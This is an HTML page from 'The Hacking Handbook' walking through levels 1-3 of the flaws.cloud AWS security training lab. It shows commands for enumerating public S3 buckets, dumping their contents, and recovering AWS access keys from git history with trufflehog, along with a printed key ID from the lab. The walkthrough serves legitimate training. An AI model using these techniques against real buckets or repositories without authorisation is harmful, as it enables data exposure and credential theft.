@@ -1,0 +1,1027 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="The encyclopedia for offensive security in the cloud.">
+      
+      
+      
+        <link rel="canonical" href="https://0xeval.github.io/aws/training_labs/flaws/">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>Flaws I - The Hacking Handbook</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.975780f9.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.2505c338.min.css">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#flaws-i" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="The Hacking Handbook" class="md-header__button md-logo" aria-label="The Hacking Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            The Hacking Handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Flaws I
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent=""  aria-label="Switch to Dark Mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to Dark Mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9v1Z"/></svg>
+            </label>
+          
+        
+          
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent=""  aria-label="Switch to Light Mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to Light Mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/0xEval/0xeval.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    0xeval/hackinghandbook
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="The Hacking Handbook" class="md-nav__button md-logo" aria-label="The Hacking Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    The Hacking Handbook
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/0xEval/0xeval.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    0xeval/hackinghandbook
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          AWS
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          AWS
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../enumeration/" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_2" type="checkbox" id="__nav_1_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_1_2">
+          Training Labs
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Training Labs" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_2">
+          <span class="md-nav__icon md-icon"></span>
+          Training Labs
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Flaws I
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Flaws I
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1-enumerating-public-s3-buckets-unauthenticated" class="md-nav__link">
+    Level 1 - Enumerating public S3 buckets (Unauthenticated)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2-enumerating-public-s3-buckets-aws-users" class="md-nav__link">
+    Level 2 - Enumerating public S3 buckets (AWS users)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-hunting-keys-in-git-repository" class="md-nav__link">
+    Level 3 - Hunting Keys in .Git Repository
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4-enumerating-ec2-instance" class="md-nav__link">
+    Level 4 - Enumerating EC2 Instance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5-ssrf-on-aws-metadata-service" class="md-nav__link">
+    Level 5 - SSRF on AWS Metadata Service
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6-exploiting-aws-lambda-functions" class="md-nav__link">
+    Level 6 - Exploiting AWS Lambda Functions
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flaws2/" class="md-nav__link">
+        Flaws II
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Mobile
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Mobile" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Mobile
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mobile/enumeration/" class="md-nav__link">
+        Objection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1-enumerating-public-s3-buckets-unauthenticated" class="md-nav__link">
+    Level 1 - Enumerating public S3 buckets (Unauthenticated)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2-enumerating-public-s3-buckets-aws-users" class="md-nav__link">
+    Level 2 - Enumerating public S3 buckets (AWS users)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-hunting-keys-in-git-repository" class="md-nav__link">
+    Level 3 - Hunting Keys in .Git Repository
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4-enumerating-ec2-instance" class="md-nav__link">
+    Level 4 - Enumerating EC2 Instance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5-ssrf-on-aws-metadata-service" class="md-nav__link">
+    Level 5 - SSRF on AWS Metadata Service
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6-exploiting-aws-lambda-functions" class="md-nav__link">
+    Level 6 - Exploiting AWS Lambda Functions
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/0xEval/0xeval.github.io/edit/master/docs/aws/training_labs/flaws.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="flaws-i">Flaws I</h1>
+<p>Link to Challenge: <a href="http://flaws.cloud">flaws.cloud</a><br />
+Credits: <a href="https://twitter.com/0xdabbad00">@0xdabbad00</a></p>
+<h2 id="level-1-enumerating-public-s3-buckets-unauthenticated">Level 1 - Enumerating public S3 buckets (Unauthenticated)</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p>
+</div>
+<p>Our first task is to perform some enumeration round the domain itself:</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ dig flaws.cloud A +noall +answer
+flaws.cloud.        5   IN  A   52.92.180.235
+flaws.cloud.        5   IN  A   52.92.211.59
+flaws.cloud.        5   IN  A   52.92.212.59
+flaws.cloud.        5   IN  A   52.218.137.66
+flaws.cloud.        5   IN  A   52.218.177.90
+flaws.cloud.        5   IN  A   52.218.183.171
+flaws.cloud.        5   IN  A   52.218.224.91
+flaws.cloud.        5   IN  A   52.218.230.2
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ nslookup 52.92.180.235
+235.180.92.52.in-addr.arpa  name = s3-website-us-west-2.amazonaws.com.
+</code></pre></div>
+<p>With this, we can infer that <code>flaws.cloud</code> is a static website hosted from a S3 bucket and that it is hosted on the <code>us-west-2</code> region.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level1$ aws s3 ls s3://flaws.cloud --region us-west-2
+2017-03-13 23:00:38       2575 hint1.html
+2017-03-02 23:05:17       1707 hint2.html
+2017-03-02 23:05:11       1101 hint3.html
+2020-05-22 14:16:45       3162 index.html
+2018-07-10 12:47:16      15979 logo.png
+2017-02-26 20:59:28         46 robots.txt
+2017-02-26 20:59:30       1051 secret-dd02c7c.html
+</code></pre></div>
+<p>An alternative way (automated) to look for **any** open S3 bucket using the <a href="https://github.com/initstring/cloud_enum"><code>cloud_enum</code></a> tool would look like this:</p>
+<div class="highlight"><pre><span></span><code>python3 cloud_enum.py -k flaws.cloud -t 10 --disable-azure --disable-gcp -l cloud_enum_output.txt
+
+++++++++++++++++++++++++++
+      amazon checks
+++++++++++++++++++++++++++
+
+[+] Checking for S3 buckets
+  OPEN S3 BUCKET: http://flaws.cloud.s3.amazonaws.com/
+      FILES:
+      -&gt;http://flaws.cloud.s3.amazonaws.com/flaws.cloud
+      -&gt;http://flaws.cloud.s3.amazonaws.com/hint1.html
+      -&gt;http://flaws.cloud.s3.amazonaws.com/hint2.html
+      -&gt;http://flaws.cloud.s3.amazonaws.com/hint3.html
+      -&gt;http://flaws.cloud.s3.amazonaws.com/index.html
+      -&gt;http://flaws.cloud.s3.amazonaws.com/logo.png
+      -&gt;http://flaws.cloud.s3.amazonaws.com/robots.txt
+      -&gt;http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html
+
+ Elapsed time: 00:02:56
+</code></pre></div>
+<p>The scanner tells us there is an unprotected open S3 bucket pointing over at <a href="http://flaws.cloud.s3.amazonaws.com">flaws.cloud.s3.amazonaws.com</a></p>
+<p>We can list and dump its content using another tool called <a href="https://github.com/sa7mon/S3Scanner"><code>s3scanner</code></a> (not necessary, just for example's sake):</p>
+<div class="highlight"><pre><span></span><code>s3scanner --threads 10 dump --dump-dir . --bucket flaws.cloud.s3.amazonaws.com
+
+fog@cloudbreach:~/flaws/level1$ ll flaws.cloud.s3.amazonaws.com/
+total 48
+drwxrwxr-x 2 fog fog  4096 Dec 12 23:05 ./
+drwxrwxr-x 3 fog fog  4096 Dec 12 23:05 ../
+-rw-rw-r-- 1 fog fog  2575 Dec 12 22:52 hint1.html
+-rw-rw-r-- 1 fog fog  1707 Dec 12 22:52 hint2.html
+-rw-rw-r-- 1 fog fog  1101 Dec 12 22:52 hint3.html
+-rw-rw-r-- 1 fog fog  3162 Dec 12 22:52 index.html
+-rw-rw-r-- 1 fog fog 15979 Dec 12 22:52 logo.png
+-rw-rw-r-- 1 fog fog    46 Dec 12 22:52 robots.txt
+-rw-rw-r-- 1 fog fog  1051 Dec 12 22:52 secret-dd02c7c.html
+</code></pre></div>
+<p>The flag for the next level can be accessed by visiting <code>secret-dd02c7c.html</code>.</p>
+<p><img alt="" src="/images/aws/training_labs/flaws_1_level1.png" /></p>
+<hr />
+<h2 id="level-2-enumerating-public-s3-buckets-aws-users">Level 2 - Enumerating public S3 buckets (AWS users)</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.</p>
+</div>
+<p>This time we will use <code>aws cli</code> to solve the challenge. The only difference with the previous level is that we will need valid AWS access keys to be able to list and download the contents of the S3 bucket.  </p>
+<p>Profiles can be added to your local machine using <code>aws configure</code>.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level2$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile=&lt;aws_profile&gt;
+2017-02-26 21:02:15      80751 everyone.png
+2017-03-02 22:47:17       1433 hint1.html
+2017-02-26 21:04:39       1035 hint2.html
+2017-02-26 21:02:14       2786 index.html
+2017-02-26 21:02:14         26 robots.txt
+2017-02-26 21:02:15       1051 secret-e4443fc.html
+</code></pre></div>
+<p>From there we can try to download the contents of the bucket using <code>aws s3 sync</code>:</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level2$ aws s3 sync s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud . --profile=&lt;aws_profile&gt;
+</code></pre></div>
+<p><img alt="" src="/images/aws/training_labs/flaws_1_level2.png" /></p>
+<hr />
+<h2 id="level-3-hunting-keys-in-git-repository">Level 3 - Hunting Keys in .Git Repository</h2>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ git log master
+commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (master)
+Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn&#39;t have
+
+commit f52ec03b227ea6094b04e43f475fb0126edb5a61 (HEAD)
+Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
+Date:   Sun Sep 17 09:10:07 2017 -0600
+
+    first commit
+</code></pre></div>
+<p>Sometimes, developpers mess up by committing sensitive information like <strong>passwords</strong> or <strong>API keys</strong>. While they might rectify their mistake right away, all previous versions of the repository are stored in <code>.git/</code> and identified with a <strong>commit hash</strong>.</p>
+<p>To find out what <code>scott@summitroute.com</code> committed to the repository, we just need to use the <code>git checkout</code> command.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+M   index.html
+Note: switching to &#39;f52ec03b227ea6094b04e43f475fb0126edb5a61&#39;.
+
+fog@cloudbreach:~/flaws/level3$ ll
+total 168
+drwxrwxr-x 3 fog fog   4096 Dec 13 01:16 ./
+drwxrwxr-x 6 fog fog   4096 Dec 13 00:51 ../
+-rw-rw-r-- 1 fog fog     91 Dec 13 01:16 access_keys.txt    &lt;-- !!!
+drwxrwxr-x 7 fog fog   4096 Dec 13 01:16 .git/
+-rw-rw-r-- 1 fog fog   1552 Dec  8 02:44 hint1.html
+-rw-rw-r-- 1 fog fog   1426 Dec  8 02:44 hint2.html
+-rw-rw-r-- 1 fog fog   1247 Dec  8 02:44 hint3.html
+-rw-rw-r-- 1 fog fog   1035 Dec  8 02:44 hint4.html
+-rw-rw-r-- 1 fog fog   1861 Dec  8 02:44 index.html
+-rw-rw-r-- 1 fog fog     26 Dec  8 02:44 robots.txt
+</code></pre></div>
+<p>Of course, in this example we are playing with a very scarce <code>.git/</code> repo. In practice, we could leverage tools like <a href="https://github.com/trufflesecurity/trufflehog"><code>trufflehog</code></a> to help us find interesting data (also <a href="/aws/enumeration/#search-for-secrets-in-s3-buckets">see</a>)</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ cat trufflehog_output.txt 
+trufflehog dev
+Found verified result 🐷🔑
+Detector Type: AWS
+Decoder Type: PLAIN
+Raw result: AKIAJ366LIPB4IJKT7SA
+Commit: f52ec03b227ea6094b04e43f475fb0126edb5a61
+File: access_keys.txt
+Email: 0xdabbad00 &lt;scott@summitroute.com&gt;
